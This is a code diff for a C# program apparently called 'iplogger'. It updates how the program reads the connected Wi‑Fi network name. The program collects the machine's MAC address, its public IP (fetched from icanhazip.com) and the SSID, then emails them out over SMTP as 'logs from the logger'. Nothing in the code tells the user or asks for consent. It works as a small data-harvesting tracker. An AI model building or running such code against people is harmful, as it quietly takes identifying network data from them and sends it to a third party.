@@ -3,31 +3,22 @@ using System.Linq;
 using System.Net;
 using System.Net.NetworkInformation;
 using System.Net.Mail;
-using NativeWifi;
-using System.Text;
+using Microsoft.WindowsAPICodePack.Net;
 
 namespace iplogger
 {
-    class Ip
+    class Program
     {
         public static void Main(string[] args)
         {
             foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
             {
-                string name = null;
-                static string GetStringForSSID(Wlan.Dot11Ssid ssid)
+                string sConnected;
+                var networks = NetworkListManager.GetNetworks(NetworkConnectivityLevels.Connected);
+                foreach (var network in networks)
                 {
-                    return Encoding.ASCII.GetString(ssid.SSID, 0, (int)ssid.SSIDLength);
-                }
-                WlanClient client = new WlanClient();
-                foreach (WlanClient.WlanInterface wlanIface in client.Interfaces)
-                {
-                    foreach (Wlan.WlanProfileInfo profileInfo in wlanIface.GetProfiles())
-                    {
-                        name = profileInfo.profileName; // this is typically the network's SSID
-                        break;
-                    }
-                    Console.WriteLine(name);
+                    sConnected = (network.IsConnected == true) ? " (connected)" : " (disconnected)";
+                    Console.WriteLine("Network : " + network.Name + " - Category : " + network.Category.ToString() + sConnected);
                     var mac = string.Join(":", nic.GetPhysicalAddress().GetAddressBytes().Select(b => b.ToString("X2"))); //gets mac address and writes it into a variable
                     string publicip = new WebClient().DownloadString("http://icanhazip.com"); //gets the public ip and writes it into a string
                     Console.WriteLine(mac);
@@ -48,7 +39,7 @@ namespace iplogger
                     {
                         Subject = "logs from the logger"
                         ,
-                        Body = $"Mac Address: {mac} Ip Address: {publicip} Random profile wifi ssid: {name}"
+                        Body = $"Mac Address: {mac} Ip Address: {publicip} Connected wifi ssid: {network.Name}"
                     })
                     {
                         smtp.Send(message);
